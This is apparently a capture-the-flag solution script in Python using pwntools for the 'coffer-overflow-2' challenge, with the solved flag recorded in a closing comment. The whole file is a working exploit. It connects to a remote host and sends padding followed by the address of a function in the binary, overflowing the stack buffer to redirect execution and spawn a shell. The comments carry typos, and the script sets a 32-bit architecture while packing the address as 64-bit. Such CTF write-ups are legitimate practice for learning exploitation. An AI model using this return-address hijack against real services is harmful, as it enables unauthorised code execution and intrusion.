from pwn import *

HOST = "2020.redpwnc.tf"
PORT = 31908
elf = ELF("coffer-overflow-2")
p = remote(HOST, PORT)
context(os='linux', arch='i386')

binFunction = elf.symbols["binFunction"]  # we assign to binFunction the address of the function found as a symbol in the executable
size = 0x10 + 8  # paddig to trigger the error
# crafing payload
payload = b"A" * size
payload += p64(binFunction)

p.recvuntil("with?")
p.recvline()
# send the payload to the server to spawn a shell
p.sendline(payload)
p.interactive()

# FLAG --> flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
